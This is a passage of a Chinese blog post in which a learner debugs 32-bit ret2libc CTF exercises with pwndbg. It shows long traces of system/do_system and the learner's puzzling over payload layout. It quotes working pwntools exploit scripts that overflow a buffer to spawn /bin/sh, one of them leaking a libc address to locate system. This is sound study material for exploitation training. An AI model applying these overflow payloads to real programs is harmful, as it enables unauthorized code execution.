&lt;system+29&gt;       jmp    do_system                 &lt;do_system&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d941c0 &lt;do_system&gt;       push   ebp</span><br><span class="line">   0xf7d941c1 &lt;do_system+1&gt;     mov    ebp, eax</span><br><span class="line">   0xf7d941c3 &lt;do_system+3&gt;     push   edi</span><br><span class="line">   0xf7d941c4 &lt;do_system+4&gt;     call   __x86.get_pc_thunk.di     &lt;__x86.get_pc_thunk.di&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7d941c9 &lt;do_system+9&gt;     add    edi, 0x1a9e37</span><br><span class="line">   0xf7d941cf &lt;do_system+15&gt;    push   esi</span><br><span class="line">   0xf7d941d0 &lt;do_system+16&gt;    push   ebx</span><br><span class="line">   0xf7d941d1 &lt;do_system+17&gt;    sub    esp, 0x33c</span><br><span class="line">   0xf7d941d7 &lt;do_system+23&gt;    mov    eax, dword ptr gs:[0x14]</span><br><span class="line">   0xf7d941dd &lt;do_system+29&gt;    mov    dword ptr [esp + 0x32c], eax</span><br><span class="line">   0xf7d941e4 &lt;do_system+36&gt;    xor    eax, eax</span><br><span class="line">   0xf7d941e6 &lt;do_system+38&gt;    lea    ebx, [esp + 0x150]</span><br><span class="line">   0xf7d941ed &lt;do_system+45&gt;    lea    eax, [esp + 0x1d0]</span><br><span class="line">   0xf7d941f4 &lt;do_system+52&gt;    mov    dword ptr [esp + 0x1c], 0xffffffff</span><br><span class="line">   0xf7d941fc &lt;do_system+60&gt;    mov    dword ptr [esp + 0x150], 1</span><br><span class="line">   0xf7d94207 &lt;do_system+71&gt;    mov    dword ptr [esp + 0x1d4], 0</span><br><span class="line">   0xf7d94212 &lt;do_system+82&gt;    lea    esi, [esi]</span><br><span class="line">   0xf7d94218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9421e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d94221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d94223 &lt;do_system+99&gt;    jne    do_system+88                    &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d94218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9421e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d94221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d94223 &lt;do_system+99&gt;    jne    do_system+88                    &lt;do_system+88&gt;</span><br><span class="line">   </span><br><span class="line"><span class="comment">#好吧，进循环了，后面还有n个循环，暂且中止，要是能有个做底层汇编，会写操作系统内核的大佬带我该多好啊</span></span><br><span class="line"><span class="comment">#又或许我只是需要去系统的学习一下汇编再多写写汇编代码罢了</span></span><br></pre></td></tr></table></figure><p>中间很奇怪，因为我们的/bin/sh的地址0x8048720存储在栈地址0xfff5eb14上，所以我一直看着esp什么时候会指向0xfff5eb14，但一路调下来，最高也就指到了0xfff5eb10这一栈地址，而在下图中，我发现ebp存储了我们的/bin/sh，</p><p><img src="image-20220419213546772.png" alt="image-20220419213546772"></p><p><img src="image-20220419213744042.png" alt="image-20220419213744042"></p><br/><p>头疼，莫名其妙的，还是没搞明白为什么这串payload中间要隔四个字符再放/bin/sh的地址，一但进入plt表后我的思路就全乱了，本来是打算找到那几条关键的汇编，连在一起做一个验证，结果我发现我得在成千上万条汇编中找出我想要的那几条……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([&#x27;a&#x27; * 112, system_plt, &#x27;b&#x27; * 4, binsh_addr])</span><br></pre></td></tr></table></figure><p>而ret2libc3中的payload可以这…等等p32(system_addr) + ‘aaaa’ + p32(buf2_addr)，的确还是隔了四个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;aaaa&#x27; + p32(buf2_addr)</span><br></pre></td></tr></table></figure><br/><p>再研究一下ret2libc1、ret2libc2、ret2libc3的exp，这里拿  <a href="https://blog.csdn.net/qq_40827990/article/details/86662079?ops_request_misc=%7B%22request_id%22:%22164828478816780271961568%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164828478816780271961568&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-86662079.142%5Ev5%5Epc_search_result_cache,143%5Ev6%5Eregister&utm_term=ret2libc2&spm=1018.2226.3001.4187">Ret2libc_钞sir的博客-CSDN博客_ret2libc </a> 这个博客的exp做观察</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#ret2libc1</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">system_addr = 0x08048460</span><br><span class="line">binsh_addr = 0x8049720</span><br><span class="line">p.recvuntil(&#x27;RET2LIBC &gt;_&lt;\n&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ret2libc2</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">buf2_addr = 0x804a080</span><br><span class="line">gets_addr = 0x8048460</span><br><span class="line">system_addr = 0x8048490</span><br><span class="line">pop_ebx_addr = 0x0804843d</span><br><span class="line">p.recvuntil(&#x27;What do you think ?&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;aaaa&#x27; + p32(buf2_addr))</span><br><span class="line">p.sendline(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ret2libc3</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">start_addr = 0x80484d0</span><br><span class="line">puts_plt_addr = 0x8048460</span><br><span class="line">libc_start_main_got_addr = 0x804a024</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;q&#x27;*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr))</span><br><span class="line">libc_start_main_addr = u32(p.recv(4))</span><br><span class="line">print &quot;__libc_start_main_addr: &quot; + hex(libc_start_main_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;) + 0xb9</span><br><span class="line">print &quot;system_addr: &quot; + hex(system_addr)</span><br><span class="line">print &quot;binsh_addr: &quot; + hex(binsh_addr)</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;s&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1：&#x27;a&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">2：&#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;aaaa&#x27; + p32(buf2_addr)</span><br><span class="line"></span><br><span class="line">3：&#x27;q&#x27;*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr)</span><br><span class="line">   &#x27;s&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>说真的，之前我还以为pwn没啥东西，就一个栈（ROP）、堆、整数、格式化字符串就没了，还打算学完pwn就去搞web，现在看来，我是小丑，一个基础ROP就搞得头皮发麻。</p><p>算了，得转换策略了，之后以刷题为主吧，ROP里的payload构造就那些东西，而且形式可以套用，即使不知道底层运作原理也能把题解出来，等以后工作的时候，研究了汇编再去想它的底层是如何运作的吧。</p><p>还是老老实实地做一个只会做pwn题的five比较好</p><p><img src="image-20220419224555435.png" alt="image-20220419224555435"></p><br/><br/><p>在程序的即将结束的前几步中，出现了esp指向/bin/sh这一我想要的结果</p><p><img src="image-20220420101612097.png" alt="image-20220420101612097"></p><br/><br/><h1 id="exp中payload分析1（请看这）"><a href="#exp中payload分析1（请看这）" class="headerlink" title="exp中payload分析1（请看这）"></a>exp中payload分析1（请看这）</h1><p>在经历了种种反复调试观察之后，我发现我也渐渐的熟练，这里再最后尝试一次，看能不能得出我想要的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#plt、got寻找system函数部分的汇编代码</span><br><span class="line"></span><br><span class="line"> ► 0x8048683  &lt;main+107&gt;         mov    eax, 0</span><br><span class="line">   0x8048688  &lt;main+112&gt;         leave  </span><br><span class="line">   0x8048689  &lt;main+113&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048460  &lt;system@plt&gt;       jmp    dword ptr [system@got.plt]    &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048466  &lt;system@plt+6&gt;     push   0x18</span><br><span class="line">   0x804846b  &lt;system@plt+11&gt;    jmp    0x8048420                     &lt;0x8048420&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048420                     push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x8048426                     jmp    dword ptr [0x804a008]         &lt;0xf7f71b10&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7f71b10             endbr32 </span><br><span class="line">   0xf7f71b14             push   eax</span><br><span class="line">   0xf7f71b15             push   ecx</span><br><span class="line">   0xf7f71b16             push   edx</span><br><span class="line">   0xf7f71b17             mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7f71b1b             mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7f71b1f             call   0xf7f6b7d0                    &lt;0xf7f6b7d0&gt;</span><br><span class="line"> </span><br><span class="line"> ► 0xf7f71b24             pop    edx</span><br><span class="line">   0xf7f71b25             mov    ecx, dword ptr [esp]</span><br><span class="line">   0xf7f71b28             mov    dword ptr [esp], eax</span><br><span class="line">   0xf7f71b2b             mov    eax, dword ptr [esp + 4]</span><br><span class="line">   0xf7f71b2f             ret    0xc</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91790 &lt;system&gt;    endbr32   </span><br></pre></td></tr></table></figure><p>plt、got查找system函数地址这一过程，我们搭配以下两张图</p><p><img src="image-20220420103058481.png" alt="image-20220420103058481"></p><p><img src="image-20220420102913339.png" alt="image-20220420102913339"></p><p>可以看到，我们调用plt、got表查找system函数的过程前后ebp、esp值保持不变，ok，所以调用plt、got表的过程对我们要研究的__exp中payload分析__没有任何影响</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([&#x27;a&#x27; * 112, system_plt, &#x27;b&#x27; * 4, binsh_addr])</span><br></pre></td></tr></table></figure><p>先依照刚进system函数的时候画一个栈图吧，如下：</p><p><img src="image-20220420105207728.png" alt="image-20220420105207728"></p><p><img src="image-20220420110329913.png" alt="image-20220420110329913"></p><p>自己画的栈图如下：到这，前置工作就算完成了</p><p><img src="image-20220420110711125.png" alt="image-20220420110711125"></p><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line">#system函数部分的汇编代码</span><br><span class="line"></span><br><span class="line">   0xf7d91790 &lt;system&gt;       endbr32 </span><br><span class="line"> ► 0xf7d91794 &lt;system+4&gt;     call   __x86.get_pc_thunk.dx        &lt;__x86.get_pc_thunk.dx&gt;</span><br><span class="line">        arg[0]: 0x62626262 (&#x27;bbbb&#x27;)</span><br><span class="line">        arg[1]: 0x8048720 ◂— das     /* &#x27;/bin/sh&#x27; */</span><br><span class="line">        arg[2]: 0xff8b6b00 —▸ 0xf7f3b000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c</span><br><span class="line">        arg[3]: 0xff8b6b44 ◂— 0x0</span><br><span class="line"> </span><br><span class="line">   0xf7d91799 &lt;system+9&gt;     add    edx, 0x1a9867</span><br><span class="line">   0xf7d9179f &lt;system+15&gt;    sub    esp, 0xc</span><br><span class="line">   0xf7d917a2 &lt;system+18&gt;    mov    eax, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7d917a6 &lt;system+22&gt;    test   eax, eax</span><br><span class="line">   0xf7d917a8 &lt;system+24&gt;    je     system+40                    &lt;system+40&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7d917aa &lt;system+26&gt;    add    esp, 0xc</span><br><span class="line">   0xf7d917ad &lt;system+29&gt;    jmp    do_system                    &lt;do_system&gt;</span><br><span class="line"></span><br><span class="line">#----------------------------------------------------------#</span><br><span class="line">   0xf7d917b2 &lt;system+34&gt;    lea    esi, [esi]</span><br><span class="line">   0xf7d917b8 &lt;system+40&gt;    lea    eax, [edx - 0x5cc95]</span><br><span class="line">#----------------------------------------------------------#</span><br><span class="line">   0xf7d917ad &lt;system+29&gt;       jmp    do_system                 &lt;do_system&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d911c0 &lt;do_system&gt;       push   ebp</span><br><span class="line">   0xf7d911c1 &lt;do_system+1&gt;     mov    ebp, eax</span><br><span class="line">   0xf7d911c3 &lt;do_system+3&gt;     push   edi                       &lt;0xf7f3b000&gt;</span><br><span class="line">   0xf7d911c4 &lt;do_system+4&gt;     call   __x86.get_pc_thunk.di     __x86.get_pc_thunk.di&gt;</span><br><span class="line">        arg[0]: 0xf7f3b000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c</span><br><span class="line">        arg[1]: 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">        arg[2]: 0x62626262 (&#x27;bbbb&#x27;)</span><br><span class="line">        arg[3]: 0x8048720 ◂— das     /* &#x27;/bin/sh&#x27; */</span><br><span class="line">        </span><br><span class="line">   0xf7d911c9 &lt;do_system+9&gt;     add    edi, 0x1a9e37</span><br><span class="line">   0xf7d911cf &lt;do_system+15&gt;    push   esi</span><br><span class="line">   0xf7d911d0 &lt;do_system+16&gt;    push   ebx</span><br><span class="line">   0xf7d911d1 &lt;do_system+17&gt;    sub    esp, 0x33c</span><br><span class="line">   0xf7d911d7 &lt;do_system+23&gt;    mov    eax, dword ptr gs:[0x14]</span><br><span class="line">   0xf7d911dd &lt;do_system+29&gt;    mov    dword ptr [esp + 0x32c], eax</span><br><span class="line">   0xf7d911e4 &lt;do_system+36&gt;    xor    eax, eax</span><br><span class="line">   0xf7d911e6 &lt;do_system+38&gt;    lea    ebx, [esp + 0x150]</span><br><span class="line">   0xf7d911ed &lt;do_system+45&gt;    lea    eax, [esp + 0x1d0]</span><br><span class="line">   0xf7d911f4 &lt;do_system+52&gt;    mov    dword ptr [esp + 0x1c], 0xffffffff</span><br><span class="line">   0xf7d911fc &lt;do_system+60&gt;    mov    dword ptr [esp + 0x150], 1</span><br><span class="line">   0xf7d91207 &lt;do_system+71&gt;    mov    dword ptr [esp + 0x1d4], 0</span><br><span class="line">   0xf7d91212 &lt;do_system+82&gt;    lea    esi, [esi]</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line"> ► 0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   